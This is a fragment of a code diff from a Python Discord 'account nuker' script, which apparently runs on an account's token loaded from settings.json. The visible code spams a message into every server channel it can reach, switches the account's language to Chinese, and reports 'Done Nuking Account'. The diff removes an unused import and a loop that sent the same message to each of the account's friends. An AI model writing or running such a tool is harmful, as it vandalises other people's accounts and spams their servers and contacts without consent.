@@ -32,7 +32,6 @@ colorama.init(autoreset=True)
 
 import json
 
-from pyparsing import col
 try:
   json_data = open("settings.json")
   json_data = json.load(json_data)
@@ -107,12 +106,6 @@ async def on_ready():
                 print(colorama.Fore.GREEN + f"[+] Sent Message In Server, Server Id: {str(guild.id)}, Channel Id: {str(channel.id)}")
             except:
                 pass
-    for friend in bot.user.friends:
-        try:
-            await friend.send(otherdm)
-            print(colorama.Fore.GREEN + f"[+] Sent Message In Dms, User Id: {str(friend.id)}")
-        except:
-            pass
     print(colorama.Fore.GREEN + "[+] Done Sending Messaage In Every Channel Possible")
 
 
@@ -242,7 +235,6 @@ async def on_ready():
     if "200" not in rog2:
         print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")
     print(colorama.Fore.GREEN + "[+] Done Setting Language")
-
 
 
     print(colorama.Fore.GREEN + "[+] Done Nuking Account, You May Close This Program Now Or Press Enter To Start An Auto Language And Theme Switcher")
